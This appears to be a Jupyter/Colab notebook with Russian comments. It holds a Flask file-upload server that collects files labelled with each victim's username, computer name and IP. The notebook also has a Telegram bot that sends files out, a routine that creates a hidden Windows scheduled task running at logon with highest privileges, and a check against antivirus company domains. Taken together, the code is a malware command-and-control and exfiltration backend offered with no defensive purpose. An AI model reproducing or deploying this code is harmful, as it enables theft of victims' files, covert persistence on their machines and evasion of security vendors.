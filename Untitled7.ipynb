{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNH8xa7LZr1AEDVFctQ4Q0u",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Saauirr/KalmanPyQt/blob/master/Untitled7.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 25,
      "metadata": {
        "id": "hGFUbH24EUMO",
        "outputId": "50e45fc8-81e7-49cb-ee41-406398880e25",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting python-dotenv\n",
            "  Downloading python_dotenv-1.0.1-py3-none-any.whl (19 kB)\n",
            "Installing collected packages: python-dotenv\n",
            "Successfully installed python-dotenv-1.0.1\n",
            "Requirement already satisfied: python-dotenv in /usr/local/lib/python3.10/dist-packages (1.0.1)\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "WARNING:root:Warning: Your operating system (Linux 6.1.85+) may not be fully supported.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " * Serving Flask app '__main__'\n",
            " * Debug mode: off\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "INFO:werkzeug:\u001b[31m\u001b[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\u001b[0m\n",
            " * Running on all addresses (0.0.0.0)\n",
            " * Running on http://127.0.0.1:5000\n",
            " * Running on http://172.28.0.12:5000\n",
            "INFO:werkzeug:\u001b[33mPress CTRL+C to quit\u001b[0m\n"
          ]
        }
      ],
      "source": [
        "!pip install python-dotenv\n",
        "!pip install python-dotenv\n",
        "\n",
        "import os\n",
        "from datetime import datetime, timedelta\n",
        "import logging\n",
        "import subprocess\n",
        "import sys\n",
        "import socket\n",
        "from flask import Flask, request, send_from_directory\n",
        "import platform\n",
        "from dotenv import load_dotenv\n",
        "\n",
        "# Импорт библиотеки для работы с Telegram\n",
        "try:\n",
        "    from telebot import TeleBot\n",
        "except ImportError:\n",
        "    print(\"Необходимо установить библиотеку pyTelegramBotAPI. Установите её с помощью команды: pip install pyTelegramBotAPI\")\n",
        "    sys.exit(1)\n",
        "\n",
        "# Загрузка переменных среды\n",
        "load_dotenv()\n",
        "TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')\n",
        "CHAT_ID = os.getenv('CHAT_ID')\n",
        "\n",
        "# Настройка Flask и Telegram bot\n",
        "app = Flask(__name__)\n",
        "bot = TeleBot(TELEGRAM_TOKEN)\n",
        "\n",
        "# Настройка логирования\n",
        "logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n",
        "\n",
        "# Список доменов антивирусных компаний\n",
        "ANTIVIRUS_DOMAINS = [\"antivirus-example.com\", \"security-example.com\"]\n",
        "\n",
        "def check_os_compatibility():\n",
        "    supported_versions = ['7', '8', '10', '11']\n",
        "    if platform.system() == \"Windows\" and platform.release() in supported_versions:\n",
        "        logging.info(f\"Operating system Windows {platform.release()} is supported.\")\n",
        "    else:\n",
        "        logging.warning(f\"Warning: Your operating system ({platform.system()} {platform.release()}) may not be fully supported.\")\n",
        "\n",
        "def setup_hidden_task(script_path):\n",
        "    if sys.platform.startswith('win'):\n",
        "        command = f'schtasks /create /tn \"MyHiddenTask\" /tr \"{script_path}\" /sc onlogon /rl highest /f'\n",
        "        try:\n",
        "            subprocess.run(command, check=True, shell=True)\n",
        "            logging.info(\"Scheduled task created successfully for hidden execution.\")\n",
        "        except subprocess.CalledProcessError as e:\n",
        "            logging.error(f\"Failed to create scheduled task: {e}\")\n",
        "\n",
        "def is_ip_blocked(ip_address):\n",
        "    for domain in ANTIVIRUS_DOMAINS:\n",
        "        try:\n",
        "            resolved_ip = socket.gethostbyname(domain)\n",
        "            if ip_address == resolved_ip:\n",
        "                return True\n",
        "        except socket.error as e:\n",
        "            logging.error(f\"DNS resolution failed for {domain}: {e}\")\n",
        "    return False\n",
        "\n",
        "@app.route('/upload', methods=['POST'])\n",
        "def upload_file():\n",
        "    file = request.files['file']\n",
        "    client_ip = request.remote_addr\n",
        "    username = request.form.get('username', 'Unknown')\n",
        "    computer_name = request.form.get('computer_name', 'Unknown')\n",
        "    file.save(os.path.join('uploads', f\"{username}_{computer_name}_{client_ip}_{file.filename}\"))\n",
        "    return \"File uploaded successfully\", 200\n",
        "\n",
        "@app.route('/download/<filename>', methods=['GET'])\n",
        "def download_file(filename):\n",
        "    return send_from_directory(directory='archives', filename=filename)\n",
        "\n",
        "def send_file_telegram(file_path):\n",
        "    with open(file_path, 'rb') as document:\n",
        "        bot.send_document(CHAT_ID, document)\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    check_os_compatibility()\n",
        "    app.run(host='0.0.0.0', port=5000)\n"
      ]
    }
  ]
}